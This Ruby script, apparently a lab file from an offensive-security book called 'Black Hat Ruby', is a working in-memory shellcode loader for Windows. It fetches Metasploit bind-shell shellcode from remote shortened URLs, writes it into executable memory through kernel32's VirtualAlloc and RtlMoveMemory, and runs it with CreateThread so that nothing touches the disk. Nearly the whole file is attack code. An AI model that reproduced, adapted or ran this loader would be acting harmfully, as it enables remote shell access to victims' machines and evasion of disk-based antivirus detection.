#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Run shellcode in memory without touching the disk
#   Make sure that your payload architecture matches Ruby architecture
#   - eg. If your Ruby architecture is x64, the payload must be x64 too
# Requirements:
#   Windows OS
# 
unless Gem.win_platform?
  puts "[!] This script runs only on Windows OS!"
  exit!
end
  
require 'fiddle'
require 'fiddle/import'
require 'fiddle/types'
require 'open-uri'

include Fiddle

if RUBY_PLATFORM.include?("x64")
  puts "[+] Ruby architecture is: x64"
  puts "[+] Dowloading the x64 shellcode in 'Ruby process' memory"
  # x64 shellcode 
  # https://gist.githubusercontent.com/KINGSABRI/214c8e63c8e61978d69974f7bb3ad852/raw/msf-bindshellx64.txt
  shellcode = [open('https://tinyurl.com/BHR-bindshellx64').read].pack('H*')
elsif RUBY_PLATFORM.include?("i386")
  puts "[+] Ruby architecture is: x86"
  puts "[+] Dowloading the x86 shellcode in 'Ruby process' memory"
  # x86 shellcode 
  # https://gist.githubusercontent.com/KINGSABRI/00717eaf40988885a9c3d2372a10a712/raw/msf-bindshell.txt
  shellcode = [open('https://tinyurl.com/BHR-bindshell').read].pack('H*')
else
  puts "[!] Unknown architecture."
  puts RUBY_PLATFORM
end

# Load kernel32.dll class
puts "[-] Loading kernel32.dll"
kernel32 = Fiddle.dlopen('kernel32')

# allocate a virtual memeory for our shellcde
puts "[-] VirtualAlloc"
ptr = Function.new(kernel32['VirtualAlloc'], [4,4,4,4], 4).call(0, shellcode.size, 0x3000, 0x40)

# change the protection of the allocated memory (optional)
puts "[-] VirtualProtect"
Function.new(kernel32['VirtualProtect'], [4,4,4,4], 4).call(ptr, shellcode.size, 0, 0)

# create a buffer that contains our shellcode
puts "[-] Create buffer and copy shellcode"
buf = Fiddle::Pointer[shellcode]

# copy the buffer to the allocated memory
puts "[-] RtlMoveMemory"
Function.new(kernel32['RtlMoveMemory'], [4, 4, 4], 4).call(ptr, buf, shellcode.size)

puts "[-] WriteProcessMemory"
Function.new(kernel32['WriteProcessMemory'], [4, 4, 4, 4, 4], 4).call(ptr, 0, buf, shellcode.size, 0)

# create a thread that executes the shellcode that allocated in the memory
puts "[-] CreateThread"
thread = Function.new(kernel32['CreateThread'], [4,4,4,4,4,4], 4).call(0, 0, ptr, 0, 0, 0)

# wait forever for the shellcode thread execution
puts "[-] WaitForSingleObject"
Function.new(kernel32['WaitForSingleObject'], [4,4], 4).call(thread, -1)
